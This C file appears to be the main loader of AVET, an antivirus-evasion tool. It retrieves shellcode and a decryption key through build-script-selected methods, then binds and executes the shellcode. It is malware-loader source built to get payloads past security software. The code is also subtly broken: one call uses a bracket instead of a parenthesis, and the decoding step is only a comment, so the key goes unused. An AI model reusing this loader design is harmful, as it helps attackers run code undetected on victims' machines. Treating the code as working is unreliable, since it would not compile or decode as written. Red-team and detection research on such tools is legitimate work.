/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
*/

//     "         .==,_                                          \n"
//     "        .===,_`\\                                        \n"
//     "      .====,_ ` \\      .====,__                         \n"
//     "---     .==-,`~. \\           `:`.__,                    \n"
//     " ---      `~~=-.  \\           /^^^     MEEP MEEP        \n"
//     "   ---       `~~=. \\         /                          \n"
//     "                `~. \\       /                           \n"
//     "                  ~. \\____./                            \n"
//     "                    `.=====)                            \n"
//     "                 ___.--~~~--.__                         \n"
//     "       ___\\.--~~~              ~~~---.._|/              \n"
//     "       ~~~\\\"                             /              \n"

//     " ________  ___      ___ _______  _________  \n" 
//     "|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
//     "\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
//     " \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
//     "  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
//     "   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
//     "    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
//         "\n\nAnti Virus Evasion Tool by Daniel Sauder\n"


// Include shellcode decoding method to be used here
#include "encoding.h"

// Include shellcode binding technique to be used here
#include "shellcode_binding.h"

// Include file that contains the implementation of the selected get_shellcode method
// The included file is assembled by the build script
#include "get_shellcode/get_shellcode.include"

// Include file that contains the implementation of the selected get_key method
// The included file is assembled by the build script
#include "get_key/get_key.include"


int main (int argc, char **argv)
{		
	// Include evasion techniques to be used here
	//#include "evasion.h"	
	
	// --- RETRIEVE SHELLCODE ---
	// This function pointer should be used in the main executable to store the data_retrieval function that will be used for fetching the shellcode.
	unsigned char *(*get_shellcode)(char *, int *);
	
	// Include C code that actually assigns the desired data_retrieval method to the get_shellcode function.
	// The included file is assembled by the build script.
	#include "get_shellcode/get_shellcode.assign"
		
	// Retrieve shellcode
	int shellcode_size = 0;	
	unsigned char *shellcode = get_shellcode(argv[1], &shellcode_size);	
	
	// --- RETRIEVE DECRYPTION KEY ---
	// This function pointer should be used in the main executable to store the data_retrieval function that will be used for fetching the decryption key.
	unsigned char *(*get_key)(char *, int *);
	
	// Include C code that actually assigns the desired data_retrieval method to the get_key function.
	// The included file is assembled by the build script.
	#include "get_key/get_key.assign"
	
	// Retrieve key
	int key_size = 0;
	unsigned char *key = get_key[argv[2], &key_size);
	
	// Decode shellcode
	//void decode_shellcode(const unsigned char *ciphertext, unsigned char *plaintext, const int ciphertext_length, const unsigned char key)
	
	
	// Bind and execute shellcode here
	// buf is defined in defs.h by make_avet and contains the shellcode	
	bind_shellcode(shellcode);
	
	return 0;
}